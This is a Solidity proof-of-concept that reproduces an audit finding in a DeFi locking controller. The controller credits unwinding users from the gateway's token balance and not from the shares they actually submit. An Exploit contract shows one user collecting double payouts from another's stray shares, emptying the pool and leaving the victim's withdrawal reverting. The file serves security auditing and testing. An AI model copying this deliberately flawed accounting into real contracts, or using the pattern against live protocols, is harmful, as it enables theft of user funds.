// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  InfiniFi — startUnwinding credits the gateway balance (Spearbit, Mar 2025)
    SYNTHETIC, cheatcode-free reduction.
    LockingController reads share.balanceOf(gateway) instead of `_shares`.
    Alice's accidental 1000 shares sit on the gateway. Bob unwinds 1000 and is
    credited 2000 receipt tokens. After Carol unwinds, the bucket is empty and
    Alice's startUnwinding reverts. */

contract ERC20 {
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

contract LockingController {
    ERC20 public share;
    ERC20 public receipt;
    uint256 public totalReceiptTokens;
    mapping(address => uint256) public credit;

    constructor(ERC20 s, ERC20 r) {
        share = s;
        receipt = r;
    }

    function fund(uint256 amount) external {
        totalReceiptTokens = amount; // S1
    }

    function startUnwinding(uint256 _shares, address recipient) external {
        uint256 totalShares = share.totalSupply();
        uint256 userShares = share.balanceOf(msg.sender); // @> VULN: gateway balance, not `_shares`
        uint256 userReceiptToken = (userShares * totalReceiptTokens) / totalShares;
        require(share.transferFrom(msg.sender, address(this), _shares), "pull"); // S4 only `_shares` move
        share.burn(address(this), _shares);
        require(userReceiptToken > 0, "zero credit");
        receipt.transfer(recipient, userReceiptToken); // S5
        totalReceiptTokens -= userReceiptToken;
        credit[recipient] += userReceiptToken;
    }
}

contract Gateway {
    ERC20 public share;
    LockingController public controller;

    constructor(ERC20 s, LockingController c) {
        share = s;
        controller = c;
    }

    function startUnwinding(uint256 _shares) external {
        share.transferFrom(msg.sender, address(this), _shares);
        share.approve(address(controller), _shares);
        controller.startUnwinding(_shares, msg.sender);
    }

    function rescue(address to) external {
        uint256 bal = share.balanceOf(address(this));
        share.transfer(to, bal); // S6 residual shares back to Alice
    }
}

contract User {
    function gift(ERC20 share, address gateway) external {
        share.transfer(gateway, share.balanceOf(address(this))); // S2
    }

    function unwind(Gateway gateway, ERC20 share) external {
        uint256 bal = share.balanceOf(address(this));
        share.approve(address(gateway), bal);
        gateway.startUnwinding(bal); // S3
    }
}

contract Exploit {
    uint256 public constant FINDING = 55056;
    uint256 public constant UNIT = 1000e6;
    ERC20 public share;
    ERC20 public receipt;
    LockingController public controller;
    Gateway public gateway;
    User public alice;
    User public bob;
    User public carol;
    bool public aliceReverted;

    constructor() {
        share = new ERC20("liUSD", 6);
        receipt = new ERC20("iUSD", 6);
        controller = new LockingController(share, receipt);
        gateway = new Gateway(share, controller);
        alice = new User();
        bob = new User();
        carol = new User();
    }

    function run() external {
        share.mint(address(alice), UNIT);
        share.mint(address(bob), UNIT);
        share.mint(address(carol), UNIT);
        receipt.mint(address(controller), UNIT * 3);
        controller.fund(UNIT * 3);
        alice.gift(share, address(gateway));
        bob.unwind(gateway, share);
        require(controller.credit(address(bob)) == UNIT * 2, "bob credit");
        carol.unwind(gateway, share);
        gateway.rescue(address(alice));
        try alice.unwind(gateway, share) {
            revert("alice unwound");
        } catch {
            aliceReverted = true; // S7
        }
        require(aliceReverted, "expected revert");
        require(receipt.balanceOf(address(bob)) == UNIT * 2, "bob tokens");
        require(controller.totalReceiptTokens() == 0, "bucket empty");
        require(share.balanceOf(address(alice)) == UNIT, "alice shares stuck");
    }
}
